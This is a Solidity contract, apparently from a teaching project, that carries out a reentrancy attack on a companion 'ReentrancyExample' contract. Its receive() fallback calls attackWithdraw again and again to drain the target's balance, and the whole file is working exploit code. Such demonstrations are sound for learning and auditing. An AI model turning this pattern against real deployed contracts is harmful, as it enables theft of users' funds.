// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {ReentrancyExample} from "./ReentrancyExample.sol";

contract AttackWithdraw {
    ReentrancyExample public reentrancyExample;

    constructor(address _reentrancyExample) {
        reentrancyExample = ReentrancyExample(payable(_reentrancyExample));
    }

    function deposit() public payable {
        (bool success, ) = address(reentrancyExample).call{value: msg.value}(
            ""
        );
        require(success);
    }

    function attackWithdraw() public {
        if (
            address(reentrancyExample).balance >
            reentrancyExample.balances(address(this))
        ) {
            reentrancyExample.withdraw();
        }
    }

    receive() external payable {
        this.attackWithdraw();
    }
}
